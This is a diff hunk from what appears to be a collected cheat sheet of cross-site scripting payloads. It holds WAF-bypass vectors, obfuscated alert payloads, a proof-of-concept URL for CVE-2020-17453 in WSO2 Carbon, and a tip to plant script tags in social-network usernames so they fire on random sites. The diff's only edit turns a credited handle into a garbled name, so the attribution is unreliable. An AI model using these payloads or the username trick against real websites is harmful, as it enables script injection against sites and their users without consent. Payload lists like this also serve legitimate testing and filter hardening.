@@ -593,7 +593,7 @@
   Bypass: '"><%252fscript>
 - XSS vector on chat messages inputs
   <svg<script> onmou<script>seover</script>="alert('xss')">hii</svg</script>>
-- 🚨 New CloudFlare XSS Bypass! 🚨 @JacksonHHax
+- 🚨 New CloudFlare XSS Bypass! 🚨 @JacofficenHHax
   <svg onload=alert%26%230000000040"1")>
 - <svg/onload =’[][`cons`+`tructor`][`const`+`ructor`](`aler`+`t(1)`)()’>
 - Don't forget about setting up your username on every social network to "<script>alert(1)</script>" just in case some website you might be singing it with your account might not properly do filtering or encoding. (Found XSS on a random website this way 😂)
@@ -788,7 +788,7 @@
   jaVasCript:/–><svg/onload=’+/”/+/onmouseover=1/+/[/[]/+alert(1337)//’>
   –
   Credit :- @0dayCTF …
-- Disclosing CVE-2020-17453! @JacksonHHax
+- Disclosing CVE-2020-17453! @JacofficenHHax
   XSS In WSO2 Carbon Management Console
   PoC: https://example[.]com/carbon/admin/login.jsp?msgId=%27;alert(1)//
 - XSS 500 Internal Server error bypass :p
